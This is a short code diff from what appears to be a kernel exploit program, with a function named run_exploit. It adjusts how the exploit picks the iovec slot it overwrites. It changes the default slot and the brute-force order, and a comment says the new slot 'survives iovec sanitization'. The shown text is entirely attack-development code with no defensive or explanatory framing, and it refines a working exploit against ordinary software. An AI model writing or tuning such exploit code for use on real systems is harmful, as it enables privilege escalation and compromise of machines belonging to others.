@@ -246,7 +246,7 @@ static void overlay_fill_word(struct iovec *iv, int n, int slot, uint64_t v) {
 
 static void overlay_fill_iovec(struct iovec *iv, int n, int base_word) {
   memset(iv, 0, sizeof(*iv) * (size_t)n);
-  int w0_slot = env_int_range("PVM_W0_SLOT", base_word, 0, 15);
+  int w0_slot = env_int_range("PVM_W0_SLOT", 9, 0, 15);
   for (int w = 0; w < 10; w++) {
     int slot = (w == 0) ? w0_slot : (base_word + w);
     if (slot < 0 || slot >= 2 * n) continue;
@@ -971,7 +971,7 @@ int run_exploit(int argc, char **argv) {
         unsigned long orig_brk = (unsigned long)syscall(SYS_brk, 0);
         setenv("PVM_W0_POISON", "1", 1); /* panic at marker = slot found */
         for (int i = 0; i <= 15; i++) {
-          int slot = (6 + i) % 16; /* start at the mathematically expected 6 */
+          int slot = (9 + i) % 16; /* len-slot first: survives iovec sanitization */
           char s[8];
           snprintf(s, sizeof(s), "%d", slot);
           setenv("PVM_W0_SLOT", s, 1);
